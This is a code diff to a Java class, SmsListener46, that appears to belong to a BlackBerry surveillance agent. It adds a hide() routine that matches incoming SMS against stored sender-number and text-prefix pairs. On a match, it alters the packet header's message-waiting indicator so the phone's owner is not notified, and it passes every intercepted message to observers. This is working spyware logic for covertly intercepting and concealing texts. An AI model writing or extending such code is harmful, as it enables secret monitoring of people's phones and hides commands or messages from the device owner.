@@ -1,6 +1,7 @@
 package blackberry.agent.sms;
 
 import java.io.IOException;
+import java.util.Enumeration;
 
 import javax.microedition.io.Connector;
 import javax.microedition.io.Datagram;
@@ -18,6 +19,7 @@ import net.rim.device.api.ui.component.EditField;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.SmsObserver;
+import blackberry.utils.Check;
 
 public class SmsListener46 extends SmsListener implements SendListener {
     private static final long GUID = 0xe78b740082783263L;
@@ -38,7 +40,7 @@ public class SmsListener46 extends SmsListener implements SendListener {
     //#endif
 
     private static SmsListener46 instance;
-    
+
     private SmsListener46() {
     }
 
@@ -60,9 +62,9 @@ public class SmsListener46 extends SmsListener implements SendListener {
 
         return instance;
     }
-    
+
     public boolean isRunning() {
-        return _listener!=null;
+        return _listener != null;
     }
 
     protected void start() {
@@ -89,14 +91,14 @@ public class SmsListener46 extends SmsListener implements SendListener {
                 System.err.println(e.toString());
             }
         }
-        
-        synchronized boolean dispatch(
-                byte[] message, String address, Datagram d) {
+
+        synchronized boolean dispatch(byte[] message, String address,
+                boolean hidden) {
 
             final int size = smsObservers.size();
-            boolean hide=false;
+            boolean hide = false;
+            
             for (int i = 0; i < size; i++) {
-
                 final SmsObserver observer = (SmsObserver) smsObservers
                         .elementAt(i);
                 //#ifdef DEBUG
@@ -105,23 +107,10 @@ public class SmsListener46 extends SmsListener implements SendListener {
 
                 hide |= observer.onNewSms(message, address, true);
             }
+            //#ifdef DBC
+            Check.requires(hide == hidden, "mismatch hide!");
+            //#endif
 
-            if(hide){
-
-                debug.trace("hide");
-                debug.trace("dbase");
-                DatagramBase dbase = (DatagramBase) d;
-
-                debug.trace("address");
-                SmsAddress smsAddress = (SmsAddress) dbase
-                        .getAddressBase();
-                debug.trace("header");
-                SMSPacketHeader header = smsAddress.getHeader();
-                debug.trace("waiting: "
-                        + header.getMessageWaitingType());
-                header.setMessageWaitingType(3);
-            }
-            
             return true;
             //return saveLog(message, incoming);
         }
@@ -140,17 +129,26 @@ public class SmsListener46 extends SmsListener implements SendListener {
 
                     debug.trace("datagram");
                     Datagram d = _dc.newDatagram(_dc.getMaximumLength());
-                    debug.trace("receive");
+                    
+                    debug.trace("receive");                    
                     _dc.receive(d);
-                    debug.trace("getdata");
+
                     byte[] bytes = d.getData();
                     String address = d.getAddress();
                     String msg = new String(bytes);
-                    System.out.println("Received SMS text from " + address
-                            + " : " + msg);
 
-                   
-                    dispatch(bytes, address, d);
+                    boolean hidden = hide(address, msg);
+                    if (hidden) {  
+                        DatagramBase dbase = (DatagramBase) d;
+                        SmsAddress smsAddress = (SmsAddress) dbase
+                                .getAddressBase();
+                        SMSPacketHeader header = smsAddress.getHeader();
+
+                        header.setMessageWaitingType(SMSPacketHeader.WAITING_INDICATOR_TYPE_OTHER);
+                        debug.trace("hidden");
+                    }
+
+                    dispatch(bytes, address, hidden);
 
                     //Message m = _mc.receive();
                     //receivedSmsMessage(m);
@@ -160,6 +158,31 @@ public class SmsListener46 extends SmsListener implements SendListener {
                 System.err.println(e.toString());
                 e.printStackTrace();
             }
+        }
+
+        private boolean hide(String address, String msg) {
+            Enumeration hiddens = hiddenRequest.elements();
+            while (hiddens.hasMoreElements()) {
+                String[] pair = (String[]) hiddens.nextElement();
+                String number = pair[0];
+                String text = pair[1];
+                if (address.endsWith(number)) {
+                    //#ifdef DEBUG
+                    debug.trace("hide: good number");
+                    //#endif
+                    if (msg.toLowerCase().startsWith(text)) {
+                        //#ifdef DEBUG
+                        debug.trace("hide: good message");
+                        //#endif
+                        return true;
+                    }
+                }
+            }
+
+            //#ifdef DEBUG
+            debug.trace("don't have to hide this sms");
+            //#endif
+            return false;
         }
     }
 
@@ -173,7 +196,7 @@ public class SmsListener46 extends SmsListener implements SendListener {
         }
 
         final int size = smsObservers.size();
-        boolean hide=false;
+        boolean hide = false;
         for (int i = 0; i < size; i++) {
 
             final SmsObserver observer = (SmsObserver) smsObservers
@@ -187,6 +210,5 @@ public class SmsListener46 extends SmsListener implements SendListener {
 
         return true;
     }
-
 
 }
